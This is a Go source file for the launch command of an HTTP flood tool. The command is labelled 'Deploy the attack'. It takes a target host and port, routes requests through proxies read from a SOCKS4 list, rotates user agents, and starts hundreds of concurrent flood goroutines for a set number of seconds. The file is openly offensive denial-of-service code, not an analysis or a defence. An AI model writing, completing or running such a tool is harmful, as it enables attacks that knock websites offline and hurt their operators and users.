package main

import (
	"time"

	"github.com/mkideal/cli"
)

type runT struct {
	cli.Helper
	Host     string `cli:"*host"`
	Port     string `cli:"p,port" dft:"80"`
	Thread   int    `cli:"t,thread" dft:"500"`
	Method   string `cli:"method" dft:"GET"`
	Path     string `cli:"path" dft:"/"`
	File     string `cli:"f,file" dft:"socks4.txt"`
	Duration int    `cli:"d,duration" dft:"10"`
}

var attackCommand = &cli.Command{
	Name: "run",
	Desc: "Deploy the attack",
	Argv: func() interface{} {
		return new(runT)
	},
	Fn: func(ctx *cli.Context) error {
		argv := ctx.Argv().(*runT)
		useragents := getUserAgents(500)
		proxies := readLines(argv.File)
		for i := 0; i < argv.Thread; i++ {
			go flood(argv.Host, argv.Port, argv.Method, argv.Path, useragents, proxies)
		}
		time.Sleep(time.Duration(argv.Duration) * time.Second)

		return nil
	},
}
